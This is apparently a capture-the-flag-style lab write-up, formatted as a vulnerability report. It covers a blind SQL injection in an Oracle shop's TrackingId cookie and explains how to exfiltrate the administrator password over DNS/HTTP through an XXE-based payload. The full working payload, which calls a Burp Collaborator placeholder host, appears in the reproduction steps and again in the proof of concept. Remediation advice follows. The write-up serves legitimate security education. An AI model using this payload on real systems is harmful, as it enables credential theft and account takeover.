# Blind SQL Injection in TrackingId Cookie allows Out-of-Band Password Exfiltration

## 1. Executive Summary

A blind SQL injection vulnerability exists in the `TrackingId` cookie, allowing an unauthenticated attacker to execute arbitrary SQL expressions against the backend Oracle database. By combining SQL injection with XML External Entity (XXE) processing and a Burp Collaborator server, an attacker can exfiltrate the administrator's password through DNS/HTTP out-of-band interactions and subsequently authenticate as the administrator.

## 2. Vulnerability Details

- **Vulnerability Type:** Blind SQL Injection — Out-of-Band Data Exfiltration
    
- **Target Endpoint/URL:** Shop front page `/`
    
- **Affected Parameter:** `TrackingId` cookie
    
- **Database:** Oracle
    
- **Authentication Level Required:** Unauthenticated
    
- **Tool Used:** Burp Suite Professional / Burp Collaborator
    

## 3. Steps to Reproduce (STR)

1. Visit the front page of the shop.
    
2. Open **Burp Suite Professional**.
    
3. Navigate to **Proxy → HTTP history** and locate the request containing the `TrackingId` cookie.
    
4. Send the request to **Burp Repeater**.
    
5. Open the **Burp Collaborator** client and generate a Collaborator payload.
    
6. Modify the `TrackingId` cookie using the following payload:
    

```
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```

7. Replace `BURP-COLLABORATOR-SUBDOMAIN` with the generated Burp Collaborator domain.
    
8. Alternatively, right-click at the appropriate location in Burp Suite and select **Insert Collaborator payload**.
    
9. Send the modified request.
    
10. Switch to the **Collaborator** tab.
    
11. Click **Poll now**.
    
12. If no interaction appears immediately, wait several seconds and poll again because the server-side query may execute asynchronously.
    
13. Observe the DNS and HTTP interactions generated by the application.
    
14. Inspect the interaction details to locate the administrator password.
    
15. The password should appear within the Collaborator subdomain that was requested by the application.
    
16. For DNS interactions, inspect the **Description** tab to view the complete queried domain.
    
17. For HTTP interactions, inspect the **Request to Collaborator** tab and view the full domain in the **Host** header.
    
18. Copy the recovered administrator password.
    
19. In the browser, click **My account**.
    
20. Log in using:
    

- **Username:** `administrator`
    
- **Password:** recovered password
    

21. Successful authentication confirms that sensitive credentials were successfully exfiltrated through the out-of-band channel.
    

## 4. Proof of Concept (PoC)

### HTTP Request/Response

The vulnerable cookie is modified with:

```
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```

The critical portion is the SQL subquery:

```
SELECT password
FROM users
WHERE username='administrator'
```

This retrieves the administrator password from the database.

The result is then concatenated into the external entity's URL:

```
'http://' ||
(SELECT password FROM users WHERE username='administrator') ||
'.BURP-COLLABORATOR-SUBDOMAIN'
```

Conceptually, the generated external request becomes:

```
http://<ADMINISTRATOR-PASSWORD>.BURP-COLLABORATOR-SUBDOMAIN/
```

The database/server therefore performs an external DNS and/or HTTP request containing the extracted password.

### Out-of-Band Evidence

Expected Collaborator interactions include:

```
DNS interaction
    └── <ADMINISTRATOR-PASSWORD>.BURP-COLLABORATOR-SUBDOMAIN
```

and/or:

```
HTTP interaction
    Host: <ADMINISTRATOR-PASSWORD>.BURP-COLLABORATOR-SUBDOMAIN
```

The administrator password can therefore be recovered from the requested domain.

The fact that the password appears in the external interaction demonstrates **out-of-band data exfiltration from the database**.

## 5. Impact Analysis

### Technical Impact

The vulnerability allows an unauthenticated attacker to retrieve sensitive database information through an out-of-band channel.

In this lab, the attacker was able to:

- Execute SQL through the `TrackingId` cookie.
    
- Query the `users` table.
    
- Retrieve the administrator's password.
    
- Encode the password into an external domain.
    
- Force the server to make DNS/HTTP requests to Burp Collaborator.
    
- Recover the password from the resulting interaction.
    
- Authenticate as the administrator.
    

This demonstrates that blind SQL injection can result in **direct data exfiltration even when the application's HTTP response does not contain the queried database data**.

### Business Impact

Successful exploitation could expose authentication credentials and allow attackers to compromise privileged accounts. Depending on the application's privileges and database contents, the same vulnerability could potentially be used to exfiltrate other sensitive information, including user credentials, personal information, session-related data, or confidential business data.

Compromise of an administrator account could additionally lead to unauthorized access to privileged application functionality and further system compromise.

## 6. Remediation & References

### Suggested Fix

1. Use **parameterized queries / prepared statements** for all SQL queries involving user-controlled input.
    
2. Never concatenate the `TrackingId` cookie directly into SQL statements.
    
3. Apply the **principle of least privilege** to the application's Oracle database account.
    
4. Prevent unnecessary outbound network connectivity from database servers.
    
5. Apply strict **egress filtering** to restrict DNS/HTTP requests from database infrastructure.
    
6. Disable or securely configure XML external entity processing where it is not required.
    
7. Store user passwords using strong password-hashing algorithms such as **Argon2id** or **bcrypt**, never plaintext or reversible encryption.
    
8. Monitor database servers for unexpected DNS and HTTP requests.
    
9. Implement detection for repeated suspicious requests targeting database functions and external domains.
